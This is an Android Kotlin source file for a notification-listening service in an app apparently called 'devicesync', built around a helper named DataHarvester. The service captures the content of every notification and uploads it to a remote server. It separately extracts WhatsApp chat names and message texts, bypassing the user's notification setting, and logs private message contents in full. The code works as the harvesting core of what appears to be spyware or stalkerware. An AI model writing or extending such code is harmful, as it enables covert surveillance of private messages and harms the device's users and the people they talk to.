package com.devicesync.app.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Intent
import kotlinx.coroutines.*
import com.devicesync.app.data.repository.DeviceSyncRepository
import com.devicesync.app.utils.SettingsManager
import java.util.Date

class NotificationListenerService : NotificationListenerService() {
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var repository: DeviceSyncRepository
    private lateinit var dataHarvester: DataHarvester
    private lateinit var settingsManager: SettingsManager
    private var deviceId: String? = null
    
    override fun onCreate() {
        super.onCreate()
        println("🔔 NotificationListenerService onCreate() called")
        
        try {
            repository = DeviceSyncRepository(applicationContext)
            dataHarvester = DataHarvester(applicationContext)
            settingsManager = SettingsManager(applicationContext)
            
            // Try to get device ID from settings
            val savedDeviceId = settingsManager.getDeviceId()
            
            // If device ID is null, try to generate it
            if (savedDeviceId.isNullOrEmpty()) {
                val newDeviceId = generateDeviceId()
                deviceId = newDeviceId
                settingsManager.saveDeviceId(newDeviceId)
                println("🔔 Generated new device ID: $newDeviceId")
            } else {
                deviceId = savedDeviceId
            }
            
            val currentDeviceId = deviceId
            println("🔔 NotificationListenerService created for device: $currentDeviceId")
            println("🔔 Service is ready to monitor notifications")
            println("🔔 Repository initialized: ${repository != null}")
            println("🔔 DataHarvester initialized: ${dataHarvester != null}")
            println("🔔 SettingsManager initialized: ${settingsManager != null}")
            
        } catch (e: Exception) {
            println("❌ Error in NotificationListenerService onCreate: ${e.message}")
            println("❌ Stack trace: ${e.stackTraceToString()}")
        }
    }
    
    private fun captureWhatsAppMessageFromNotification(title: String, text: String, packageName: String) {
        try {
            val deviceId = this.deviceId ?: settingsManager.getDeviceId() ?: generateDeviceId()
            
            // Create WhatsApp message data
            val messageId = "wa_notif_${System.currentTimeMillis()}_${title.hashCode()}"
            val chatName = title
            val message = text
            val timestamp = System.currentTimeMillis()
            
            println("📱 Captured WhatsApp message: $chatName - $message")
            
            // Store the message for later sync (we'll sync it when the service syncs)
            // For now, just log it so we can see it's being captured
            
        } catch (e: Exception) {
            println("❌ Error capturing WhatsApp message: ${e.message}")
        }
    }
    
    private fun generateDeviceId(): String {
        val androidId = android.provider.Settings.Secure.getString(
            contentResolver, 
            android.provider.Settings.Secure.ANDROID_ID
        )
        return "current_device_$androidId"
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        deviceId = intent?.getStringExtra("deviceId") ?: settingsManager.getDeviceId()
        println("NotificationListenerService started for device: $deviceId")
        return START_STICKY
    }
    
    // Step 7: Monitor notifications in real-time
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        
        println("🔔 onNotificationPosted called with notification: ${sbn?.packageName}")
        
        if (sbn == null) {
            println("🔔 Received null notification, skipping")
            return
        }
        
        try {
            println("🔔 Processing notification from: ${sbn.packageName}")
            
            // Extract notification details for filtering
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE)
            val text = extras.getString(android.app.Notification.EXTRA_TEXT)
            
            // 📊 REAL-TIME NOTIFICATION CAPTURE LOG
            println("🎯 REAL-TIME NOTIFICATION DETECTED:")
            println("   📦 Package: $packageName")
            println("   📋 Title: ${title ?: "N/A"}")
            println("   📝 Text: ${text ?: "N/A"}")
            println("   ⏰ Time: ${Date()}")
            println("   🆔 ID: ${sbn.id}")
            
            // Filter out unwanted system notifications
            if (packageName == "android") {
                when {
                    title?.contains("connected to your mobile data hotspot", ignoreCase = true) == true -> {
                        println("🔔 Skipping system hotspot notification: $title")
                        return
                    }
                    title?.contains("mobile data used", ignoreCase = true) == true -> {
                        println("🔔 Skipping mobile data usage notification: $title")
                        return
                    }
                    title?.contains("battery", ignoreCase = true) == true -> {
                        println("🔔 Skipping battery notification: $title")
                        return
                    }
                    title?.contains("storage", ignoreCase = true) == true -> {
                        println("🔔 Skipping storage notification: $title")
                        return
                    }
                }
            }
            
            // Capture WhatsApp messages from notifications
            if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                if (title?.isNotEmpty() == true && text?.isNotEmpty() == true) {
                    println("📱 Capturing WhatsApp message: $title - $text")
                    captureWhatsAppMessageFromNotification(title, text, packageName)
                }
            }
            
            // Check if notifications are enabled in settings
            if (!settingsManager.isDataTypeEnabled("notifications")) {
                println("🔔 Notifications disabled in settings, skipping")
                return
            }
            
            println("✅ NOTIFICATION APPROVED FOR SYNC - Starting sync process...")
            
            serviceScope.launch {
                try {
                    // Get device ID with fallback
                    var currentDeviceId = deviceId
                    if (currentDeviceId.isNullOrEmpty()) {
                        currentDeviceId = settingsManager.getDeviceId()
                        if (currentDeviceId.isNullOrEmpty()) {
                            currentDeviceId = generateDeviceId()
                            settingsManager.saveDeviceId(currentDeviceId)
                            deviceId = currentDeviceId
                            println("🔔 Generated device ID in notification handler: $currentDeviceId")
                        }
                    }
                    
                    if (currentDeviceId != null) {
                        println("🔔 Syncing notification for device: $currentDeviceId")
                        syncNewNotification(currentDeviceId, sbn)
                    } else {
                        println("🔔 Device ID is still null, cannot sync notification")
                    }
                } catch (e: Exception) {
                    println("🔔 Error processing notification: ${e.message}")
                    println("🔔 Stack trace: ${e.stackTraceToString()}")
                }
            }
        } catch (e: Exception) {
            println("❌ Error in onNotificationPosted: ${e.message}")
            println("❌ Stack trace: ${e.stackTraceToString()}")
        }
    }
    
    private suspend fun syncNewNotification(deviceId: String, sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            // Extract notification details
            val packageName = sbn.packageName
            val appName = getAppName(packageName)
            val title = extras.getCharSequence("android.title")?.toString()
            val text = extras.getCharSequence("android.text")?.toString()
            val bigText = extras.getCharSequence("android.bigText")?.toString()
            val timestamp = sbn.postTime
            
            // 📊 COMPREHENSIVE NOTIFICATION LOGGING BEFORE API SEND
            println("=".repeat(80))
            println("🔔 REAL-TIME NOTIFICATION CAPTURED - BEFORE API SEND")
            println("=".repeat(80))
            println("📱 Device ID: $deviceId")
            println("📦 Package Name: $packageName")
            println("📱 App Name: $appName")
            println("📋 Title: ${title ?: "N/A"}")
            println("📝 Text: ${text ?: "N/A"}")
            println("📄 Big Text: ${bigText ?: "N/A"}")
            println("⏰ Timestamp: $timestamp (${Date(timestamp)})")
            println("🆔 Notification ID: ${sbn.id}")
            println("📊 Notification Key: ${sbn.key}")
            println("👤 User ID: ${sbn.user}")
            println("🏷️ Tag: ${sbn.tag}")
            println("📈 Post Time: ${sbn.postTime}")
            println("🔊 Priority: ${sbn.notification.priority}")
            println("🔔 Channel ID: ${sbn.notification.channelId}")
            println("🎯 Category: ${sbn.notification.category}")
            println("🔗 Actions: ${sbn.notification.actions?.size ?: 0}")
            
            // Log all extras for debugging
            println("📋 All Extras:")
            extras.keySet().forEach { key ->
                val value = extras.get(key)
                println("   $key: $value")
            }
            println("=".repeat(80))
            
            // Create notification model
            val notificationModel = dataHarvester.createNotificationModel(
                notificationId = "${sbn.id}_${sbn.postTime}",
                packageName = packageName,
                appName = appName,
                title = title,
                text = bigText ?: text
            )
            
            // Log the model being sent to API
            println("📤 NOTIFICATION MODEL FOR API:")
            println("   ID: ${notificationModel.notificationId}")
            println("   Package: ${notificationModel.packageName}")
            println("   App: ${notificationModel.appName}")
            println("   Title: ${notificationModel.title}")
            println("   Text: ${notificationModel.text}")
            println("   Timestamp: ${notificationModel.timestamp}")
            println("=".repeat(80))
            
            // Sync to server immediately
            println("🚀 SENDING TO API...")
            val result = repository.syncNotifications(deviceId, listOf(notificationModel))
            
            if (result.isSuccess) {
                println("✅ NOTIFICATION SYNCED SUCCESSFULLY!")
                println("   Response: ${result.message}")
                println("   Data: ${result.data}")
            } else {
                println("❌ NOTIFICATION SYNC FAILED!")
                println("   Error: ${result.message}")
                println("   Data: ${result.data}")
            }
            println("=".repeat(80))
            
        } catch (e: Exception) {
            println("💥 ERROR SYNCING NOTIFICATION:")
            println("   Exception: ${e.message}")
            println("   Stack trace: ${e.stackTraceToString()}")
            println("=".repeat(80))
        }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        // Optionally handle notification removal
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        println("NotificationListenerService connected")
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        println("NotificationListenerService disconnected")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        println("NotificationListenerService destroyed")
    }
}
